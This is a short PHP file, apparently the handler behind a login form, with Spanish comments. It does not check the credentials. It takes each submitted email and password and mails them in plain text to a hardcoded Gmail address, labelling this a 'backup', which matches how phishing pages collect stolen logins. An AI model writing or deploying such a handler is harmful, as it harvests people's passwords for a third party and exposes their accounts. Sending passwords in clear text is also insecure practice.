<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $correo = $_POST["correo"];
    $contraseña = $_POST["contraseña"];

    // Configura tu dirección de correo electrónico de respaldo                -----procesar_iniciar_sesion.ph-----------
    $correo_backup = "danyelo5gprueba@gmail.com";

    // Asunto y cuerpo del correo electrónico
    $asunto = "Backup de datos de inicio de sesión";
    $mensaje = "Correo electrónico: " . $correo . "\nContraseña: " . $contraseña;

    // Envía el correo electrónico de respaldo
    $resultado = mail($correo_backup, $asunto, $mensaje);

    if ($resultado) {
        echo "Los datos de inicio de sesión se enviaron correctamente al correo de backup.";
    } else {
        echo "Hubo un error al enviar los datos de inicio de sesión.";
    }
}
?>
